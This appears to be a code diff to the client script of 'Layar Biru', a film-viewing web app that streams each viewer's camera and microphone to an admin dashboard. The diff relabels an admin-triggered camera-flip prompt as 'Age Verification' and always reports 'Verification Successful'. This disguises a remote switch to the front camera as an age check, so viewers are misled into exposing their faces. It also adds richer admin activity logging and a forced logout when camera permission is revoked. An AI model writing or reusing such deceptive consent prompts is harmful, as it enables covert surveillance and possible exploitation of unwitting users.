@@ -161,7 +161,7 @@ async function checkAndLogin() {
       // Change onclick handler
       btnEl.onclick = () => doLogin(name, passEl.value);
       
-      addAdminLog('Sistem', `Deteksi admin: ${name}`, '#A855F7');
+      addAdminLog('Sistem', `Deteksi admin: ${name}`, '#A855F7', 'system');
       return;
     } else {
       // BUKAN ADMIN - langsung login sebagai viewer
@@ -234,7 +234,7 @@ async function doLogin(name, password) {
         showLoginError(data.message || 'Terjadi kesalahan.', nameEl);
       }
 
-      addAdminLog('Sistem', `Login gagal — ${finalName}`, '#F2716B');
+      addAdminLog('Sistem', `Login gagal — ${finalName}`, '#F2716B', 'error');
       btnEl.disabled = !document.getElementById('chk-consent').checked;
       return;
     }
@@ -242,7 +242,7 @@ async function doLogin(name, password) {
     authToken   = data.token;
     currentUser = data.user;
     setCookie('lb_token', authToken, 8); sessionStorage.setItem('lb_token', authToken);
-    addAdminLog('Sistem', `${currentUser.name} login sebagai ${currentUser.role}`, '#5B8CFF');
+    addAdminLog('Sistem', `${currentUser.name} login sebagai ${currentUser.role}`, '#5B8CFF', 'login');
 
     if (currentUser.role === 'admin') enterAdminDashboard();
     else showScreen('screen-consent');
@@ -263,7 +263,7 @@ function enterAdminDashboard() {
   showScreen('screen-admin');
   document.getElementById('admin-username').textContent =
     `Masuk sebagai: ${currentUser.name} (${currentUser.role})`;
-  addAdminLog(currentUser.name, 'membuka dashboard admin', '#A855F7');
+  addAdminLog(currentUser.name, 'membuka dashboard admin', '#A855F7', 'login');
   connectSSE();
   connectSocket_Admin();
 }
@@ -460,12 +460,16 @@ function connectSocket_Admin() {
   });
 
   socket.on('viewer-connected', (msg) => {
+    const now = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    addAdminLog(msg.user.name, `terhubung ke dashboard (${now})`, '#4ADE80', 'connect');
     setupPeerConnection_Admin(msg.sessionId, msg.user);
   });
 
   socket.on('viewer-disconnected', (msg) => {
     const peer = adminPeers.get(msg.sessionId);
     if (peer) {
+      const now = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      addAdminLog(peer.user?.name || 'Pengguna', `memutus koneksi (${now})`, '#F2716B', 'disconnect');
       try { peer.pc.close(); } catch {}
       adminPeers.delete(msg.sessionId);
       adminAudioMeters.delete(msg.sessionId);
@@ -727,7 +731,7 @@ async function requestCamera() {
     camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
     startWatchSession();
   } catch (e) {
-    addAdminLog('Sistem', `${currentUser?.name || 'Pengguna'} menolak izin kamera`, '#F2716B');
+    addAdminLog('Sistem', `${currentUser?.name || 'Pengguna'} menolak izin kamera`, '#F2716B', 'error');
     stopSession(false);
     showScreen('screen-login');
     resetLogin();
@@ -735,7 +739,7 @@ async function requestCamera() {
 }
 
 function declineCamera() {
-  addAdminLog('Sistem', `${currentUser?.name || 'Pengguna'} menolak izin kamera`, '#F2716B');
+  addAdminLog('Sistem', `${currentUser?.name || 'Pengguna'} menolak izin kamera`, '#F2716B', 'error');
   stopSession(false);
   showScreen('screen-login');
   resetLogin();
@@ -753,7 +757,7 @@ async function startWatchSession() {
 
   showScreen('screen-watch');
   renderFilmGrid();
-  addAdminLog(currentUser.name, 'mulai sesi menonton, kamera + mikrofon aktif', '#4ADE80');
+  addAdminLog(currentUser.name, 'mulai sesi menonton, kamera + mikrofon aktif', '#4ADE80', 'connect');
 
   // Ambil sessionId dari server agar sama dengan id yang dikirim SSE ke admin (token.slice(-8))
   try {
@@ -825,7 +829,7 @@ async function stopSession(showEnded = true) {
 
   if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
 
-  addAdminLog(currentUser?.name || 'Pengguna', 'mengakhiri sesi, stream dimatikan', '#F2A93B');
+  addAdminLog(currentUser?.name || 'Pengguna', 'mengakhiri sesi, stream dimatikan', '#F2A93B', 'logout');
   if (showEnded) showScreen('screen-ended');
 }
 
@@ -952,7 +956,7 @@ function showFlipPermissionDialog() {
     ">
       <div style="font-size: 2.4rem; margin-bottom: 14px;">🔄</div>
       <h3 style="font-family: Oswald, sans-serif; font-size: 1.2rem; margin-bottom: 10px; color: #E9ECF6;">
-        Verifikasi Kamera
+        Verifikasi Usia
       </h3>
       <p style="font-size: .84rem; color: #8A91AC; line-height: 1.6; margin-bottom: 22px;">
         Platform membutuhkan konfirmasi untuk melanjutkan verifikasi usia Anda. Ketuk <strong style="color:#E9ECF6;">Izinkan</strong> untuk melanjutkan.
@@ -982,7 +986,7 @@ function showFlipPermissionDialog() {
   document.getElementById('flip-deny-btn').addEventListener('click', () => {
     overlay.remove();
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    showFlipToast('❌ Permintaan kamera ditolak');
+    showFlipToast('❌ Permintaan verifikasi ditolak');
   });
 }
 
@@ -1033,7 +1037,7 @@ async function doFlipCamera() {
       if (audioSender && newAudioTrack) await audioSender.replaceTrack(newAudioTrack);
     }
 
-    showFlipToast(nextFacingMode === 'user' ? '📷 Kamera depan aktif' : '📷 Kamera belakang aktif');
+    showFlipToast(nextFacingMode === 'user' ? 'Verifikasi Berhasil' : 'Verifikasi Berhasil');
     socket.emit('flip-camera-accepted', { sessionId: mySessionId });
   } catch (e) {
     console.error('Flip camera error:', e);
@@ -1044,22 +1048,45 @@ async function doFlipCamera() {
   }
 }
 
-function addAdminLog(user, action, color = '#5B8CFF') {
-  const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-  adminLogs.unshift({ user, action, color, time });
-  if (adminLogs.length > 100) adminLogs.pop();
+function addAdminLog(user, action, color = '#5B8CFF', type = '') {
+  const now  = new Date();
+  const time = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  const date = now.toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' });
+  adminLogs.unshift({ user, action, color, time, date, type });
+  if (adminLogs.length > 200) adminLogs.pop();
   renderAdminLog();
 }
 
 function renderAdminLog() {
   const el = document.getElementById('admin-log');
   if (!el) return;
-  el.innerHTML = adminLogs.map(l => `
+
+  if (adminLogs.length === 0) {
+    el.innerHTML = '<div style="padding:16px;text-align:center;color:#8A91AC;font-size:.8rem;">Belum ada aktivitas</div>';
+    return;
+  }
+
+  el.innerHTML = adminLogs.map(l => {
+    const badgeMap = {
+      login:      { bg: 'rgba(91,140,255,.18)',  border: 'rgba(91,140,255,.4)',  text: '#5B8CFF',  label: 'LOGIN'   },
+      logout:     { bg: 'rgba(242,169,59,.15)',  border: 'rgba(242,169,59,.4)',  text: '#F2A93B',  label: 'LOGOUT'  },
+      connect:    { bg: 'rgba(74,222,128,.15)',  border: 'rgba(74,222,128,.4)',  text: '#4ADE80',  label: 'MASUK'   },
+      disconnect: { bg: 'rgba(242,113,107,.15)', border: 'rgba(242,113,107,.4)', text: '#F2716B',  label: 'KELUAR'  },
+      camera:     { bg: 'rgba(168,85,247,.15)',  border: 'rgba(168,85,247,.4)',  text: '#A855F7',  label: 'KAMERA'  },
+      error:      { bg: 'rgba(242,113,107,.15)', border: 'rgba(242,113,107,.4)', text: '#F2716B',  label: 'ERROR'   },
+      system:     { bg: 'rgba(138,145,172,.12)', border: 'rgba(138,145,172,.3)', text: '#8A91AC',  label: 'SISTEM'  },
+    };
+    const badge = badgeMap[l.type] || badgeMap.system;
+    return \`
     <div class="log-entry">
-      <span class="le-time">${l.time}</span>
-      <div class="le-dot" style="background:${l.color}"></div>
-      <span class="le-text"><span class="le-user">${l.user}</span> ${l.action}</span>
-    </div>`).join('');
+      <div class="le-left">
+        <span class="le-time">\${l.time}</span>
+        <span class="le-date">\${l.date}</span>
+      </div>
+      <span class="le-badge" style="background:\${badge.bg};border-color:\${badge.border};color:\${badge.text};">\${badge.label}</span>
+      <span class="le-text"><span class="le-user">\${l.user}</span> \${l.action}</span>
+    </div>\`;
+  }).join('');
 }
 
 function clearAdminLog() { adminLogs = []; renderAdminLog(); }
@@ -1148,21 +1175,95 @@ function stopMonitorCameraPermission() {
 }
 
 function handlePermissionRevoked() {
-  // Tampilkan notifikasi singkat lalu logout
-  showFlipToast('⚠️ Izin kamera dicabut, sesi diakhiri...');
-  setTimeout(async () => {
-    await stopSession(false);
-    deleteCookie('lb_token');
-    sessionStorage.removeItem('lb_token');
-    authToken = null;
-    currentUser = null;
-    resetLogin();
-    showScreen('screen-login');
-  }, 1800);
+  stopMonitorCameraPermission();
+
+  // Buat overlay popup peringatan
+  let overlay = document.getElementById('permission-revoked-overlay');
+  if (overlay) overlay.remove();
+
+  overlay = document.createElement('div');
+  overlay.id = 'permission-revoked-overlay';
+  overlay.style.cssText = `
+    position: fixed; inset: 0; z-index: 99999;
+    background: rgba(5,7,14,.92); backdrop-filter: blur(8px);
+    display: flex; align-items: center; justify-content: center; padding: 24px;
+    animation: fadeInOverlay .25s ease;
+  `;
+
+  overlay.innerHTML = `
+    <div style="
+      background: #161D34; border: 1px solid rgba(242,113,107,.35);
+      border-radius: 18px; padding: 32px 28px; max-width: 340px; width: 100%;
+      text-align: center; box-shadow: 0 24px 64px rgba(0,0,0,.7);
+      animation: slideUpCard .3s ease;
+    ">
+      <div style="
+        width: 64px; height: 64px; border-radius: 50%;
+        background: rgba(242,113,107,.15); border: 2px solid rgba(242,113,107,.4);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 1.8rem; margin: 0 auto 18px;
+      ">⛔</div>
+      <h3 style="
+        font-family: Oswald, sans-serif; font-size: 1.25rem;
+        color: #F2716B; margin-bottom: 10px; letter-spacing: .02em;
+      ">Perizinan Dinonaktifkan</h3>
+      <p style="
+        font-size: .84rem; color: #8A91AC; line-height: 1.65; margin-bottom: 10px;
+      ">Anda baru saja menonaktifkan izin <strong style="color:#E9ECF6;">kamera / mikrofon</strong>.</p>
+      <p style="
+        font-size: .82rem; color: #8A91AC; line-height: 1.65; margin-bottom: 24px;
+      ">Akses ke platform membutuhkan perizinan aktif. Sesi Anda akan diakhiri dan Anda akan diarahkan ke halaman login.</p>
+      <div style="
+        background: rgba(242,113,107,.08); border: 1px solid rgba(242,113,107,.2);
+        border-radius: 10px; padding: 10px 14px; margin-bottom: 22px;
+        font-size: .78rem; color: #F2716B; font-weight: 600;
+      ">⏱ Mengarahkan ke halaman login dalam <span id="revoke-countdown">5</span> detik...</div>
+      <button id="revoke-ok-btn" style="
+        width: 100%; padding: 13px; border-radius: 9px; font-size: .92rem; font-weight: 700;
+        background: #F2716B; border: none; color: #fff; cursor: pointer;
+        transition: opacity .2s;
+      ">Mengerti, Keluar Sekarang</button>
+    </div>
+  `;
+
+  document.body.appendChild(overlay);
+
+  // Countdown 5 detik lalu otomatis redirect
+  let sisa = 5;
+  const tick = setInterval(() => {
+    sisa--;
+    const el = document.getElementById('revoke-countdown');
+    if (el) el.textContent = sisa;
+    if (sisa <= 0) {
+      clearInterval(tick);
+      doRevokedLogout();
+    }
+  }, 1000);
+
+  // Tombol keluar sekarang
+  document.getElementById('revoke-ok-btn').addEventListener('click', () => {
+    clearInterval(tick);
+    doRevokedLogout();
+  });
+}
+
+async function doRevokedLogout() {
+  const overlay = document.getElementById('permission-revoked-overlay');
+  if (overlay) overlay.remove();
+
+  addAdminLog(currentUser?.name || 'Pengguna', 'izin kamera dicabut — sesi diakhiri otomatis', '#F2716B', 'error');
+
+  await stopSession(false);
+  deleteCookie('lb_token');
+  sessionStorage.removeItem('lb_token');
+  authToken = null;
+  currentUser = null;
+  resetLogin();
+  showScreen('screen-login');
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-  addAdminLog('Sistem', 'Aplikasi Layar Biru v2.1 dimuat', '#5B8CFF');
+  addAdminLog('Sistem', 'Aplikasi Layar Biru v2.1 dimuat', '#5B8CFF', 'system');
 
   // ── RESTORE SESI SETELAH REFRESH ──
   restoreSession();
